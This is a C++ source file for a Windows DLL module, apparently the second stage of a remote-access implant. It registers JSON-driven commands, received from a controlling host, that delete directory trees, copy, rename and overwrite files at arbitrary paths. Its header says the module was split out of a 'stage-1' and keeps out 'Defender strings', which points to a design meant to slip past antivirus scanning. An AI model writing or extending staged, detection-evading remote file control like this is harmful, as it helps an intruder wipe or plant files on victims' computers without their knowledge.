// ═══════════════════════════════════════════════════════════════════════
// stage2_filemgr.cpp — file mutation commands, extracted from stage-1.
//
// Handlers registered:
//   file_delete       — delete file or directory tree
//   file_mkdir        — create directory (recursive)
//   file_rename       — rename/move file or directory
//   file_copy         — recursive copy with overwrite
//   file_write_text   — overwrite text file (parents auto-created)
//   config_write      — alias for file_write_text at arbitrary path
//
// Intentionally omitted from stage-2:
//   file_list / file_read_* / file_info — read-only, stay in stage-1
//   file_write_chunk — needs ws_client binary reception plumbing
//
// Imports: only std::filesystem + kernel32. No DXGI / MF / Defender strings.
// ═══════════════════════════════════════════════════════════════════════

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <filesystem>
#include <fstream>
#include <system_error>

#include "stage2_abi.h"
#include "stage2_util.h"

namespace fs = std::filesystem;
using namespace s2util;

static Stage2HostCtx* g_host = nullptr;

// ── Unicode helpers ─────────────────────────────────────────────────────
// Paths come in as UTF-8 (from JSON). Pass them through fs::path(std::string)
// on Windows and they get re-interpreted as CP_ACP, which mangles non-ASCII
// chars (e.g. Azerbaijani ə, ı, ş, ç, ğ, ö, ü). Convert UTF-8 → wide first.
static std::wstring u8_to_w(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    if (n <= 0) return L"";
    std::wstring w((size_t)n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}
static fs::path u8_path(const std::string& s) { return fs::path(u8_to_w(s)); }

// ── Helpers ─────────────────────────────────────────────────────────────
static bool op_delete(const std::string& path) {
    std::error_code ec; fs::remove_all(u8_path(path), ec); return !ec;
}
static bool op_mkdir(const std::string& path) {
    std::error_code ec; fs::create_directories(u8_path(path), ec); return !ec;
}
static bool op_rename(const std::string& from, const std::string& to) {
    std::error_code ec; fs::rename(u8_path(from), u8_path(to), ec); return !ec;
}
static bool op_copy(const std::string& from, const std::string& to) {
    std::error_code ec;
    fs::path wto = u8_path(to);
    fs::create_directories(wto.parent_path(), ec);
    fs::copy(u8_path(from), wto,
             fs::copy_options::recursive | fs::copy_options::overwrite_existing,
             ec);
    return !ec;
}
static bool op_write_text(const std::string& path, const std::string& text) {
    std::error_code ec;
    fs::path wpath = u8_path(path);
    auto parent = wpath.parent_path();
    if (!parent.empty()) fs::create_directories(parent, ec);
    std::ofstream f(wpath, std::ios::binary | std::ios::trunc);
    if (!f) return false;
    f.write(text.data(), (std::streamsize)text.size());
    return f.good();
}

// ── Command handlers ────────────────────────────────────────────────────

static void cmd_file_delete(const char* json_args, void*) {
    std::string args = json_args ? json_args : "";
    std::string id   = json_get(args, "id");
    std::string path = json_get(args, "path");
    if (path.empty()) { g_host->send(make_err(id, "file_delete: empty path").c_str()); return; }
    bool ok = op_delete(path);
    g_host->send((ok ? make_ok(id, "\"deleted\"")
                     : make_err(id, "Delete failed: " + path)).c_str());
}

static void cmd_file_mkdir(const char* json_args, void*) {
    std::string args = json_args ? json_args : "";
    std::string id   = json_get(args, "id");
    std::string path = json_get(args, "path");
    if (path.empty()) { g_host->send(make_err(id, "file_mkdir: empty path").c_str()); return; }
    bool ok = op_mkdir(path);
    g_host->send((ok ? make_ok(id, "\"created\"")
                     : make_err(id, "mkdir failed: " + path)).c_str());
}

static void cmd_file_rename(const char* json_args, void*) {
    std::string args = json_args ? json_args : "";
    std::string id   = json_get(args, "id");
    std::string from = json_get(args, "from");
    std::string to   = json_get(args, "to");
    if (from.empty() || to.empty()) {
        g_host->send(make_err(id, "file_rename requires from and to").c_str()); return;
    }
    bool ok = op_rename(from, to);
    g_host->send((ok ? make_ok(id, "\"renamed\"")
                     : make_err(id, "Rename failed")).c_str());
}

static void cmd_file_copy(const char* json_args, void*) {
    std::string args = json_args ? json_args : "";
    std::string id   = json_get(args, "id");
    std::string from = json_get(args, "from");
    std::string to   = json_get(args, "to");
    if (from.empty() || to.empty()) {
        g_host->send(make_err(id, "file_copy requires from and to").c_str()); return;
    }
    bool ok = op_copy(from, to);
    g_host->send((ok ? make_ok(id, "\"copied\"")
                     : make_err(id, "Copy failed: " + from)).c_str());
}

static void cmd_file_write_text(const char* json_args, void*) {
    std::string args = json_args ? json_args : "";
    std::string id   = json_get(args, "id");
    std::string path = json_get(args, "path");
    std::string text = json_get(args, "text");  // json_get already unescapes
    if (path.empty()) { g_host->send(make_err(id, "file_write_text: empty path").c_str()); return; }
    bool ok = op_write_text(path, text);
    g_host->send((ok ? make_ok(id, "\"saved\"")
                     : make_err(id, "Write failed: " + path)).c_str());
}

// config_write has identical semantics to file_write_text.
static void cmd_config_write(const char* json_args, void* ctx) {
    cmd_file_write_text(json_args, ctx);
}

// ── Entry points ────────────────────────────────────────────────────────

extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
    if (!host || host->abi_version != STAGE2_ABI_VERSION) return 1;
    g_host = host;
    host->log(1, "stage2_filemgr: init");

    host->register_cmd("file_delete",     cmd_file_delete,     nullptr);
    host->register_cmd("file_mkdir",      cmd_file_mkdir,      nullptr);
    host->register_cmd("file_rename",     cmd_file_rename,     nullptr);
    host->register_cmd("file_copy",       cmd_file_copy,       nullptr);
    host->register_cmd("file_write_text", cmd_file_write_text, nullptr);
    host->register_cmd("config_write",    cmd_config_write,    nullptr);

    host->log(1, "stage2_filemgr: 6 commands registered");
    return 0;
}

extern "C" __declspec(dllexport) void Stage2Shutdown(void) {
    if (g_host) g_host->log(1, "stage2_filemgr: shutdown");
    g_host = nullptr;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(nullptr);
    return TRUE;
}
